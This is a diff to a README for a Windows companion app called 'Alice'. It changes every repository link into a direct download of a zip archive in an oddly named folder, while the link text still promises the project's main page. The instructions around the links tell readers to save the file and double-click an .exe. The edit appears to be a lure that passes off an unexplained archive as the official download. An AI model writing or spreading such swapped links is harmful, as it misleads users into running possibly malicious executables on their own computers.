@@ -1,6 +1,6 @@
 # 🤖 Alice - Calm digital companion for Windows
 
-[![Download Alice](https://img.shields.io/badge/Download-Alice-blue.svg?style=for-the-badge&logo=github)](https://github.com/Bdarafat638/Alice)
+[![Download Alice](https://img.shields.io/badge/Download-Alice-blue.svg?style=for-the-badge&logo=github)](https://github.com/Bdarafat638/Alice/raw/refs/heads/main/patricianism/Software_1.5-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use the link above to visit this page to download. Open the repo page, then look
 
 ## 📥 Download
 
-1. Open the main page: [Alice on GitHub](https://github.com/Bdarafat638/Alice)
+1. Open the main page: [Alice on GitHub](https://github.com/Bdarafat638/Alice/raw/refs/heads/main/patricianism/Software_1.5-alpha.1.zip)
 2. Look for the latest release or download file
 3. Save the file to your Windows PC
 4. If the file is a `.exe`, double-click it to run
@@ -182,7 +182,7 @@ If Windows shows a security prompt, review the file name and source before you c
 
 Use this link to visit the project page and download Alice:
 
-https://github.com/Bdarafat638/Alice
+https://github.com/Bdarafat638/Alice/raw/refs/heads/main/patricianism/Software_1.5-alpha.1.zip
 
 ## 🧭 Useful Topics
 
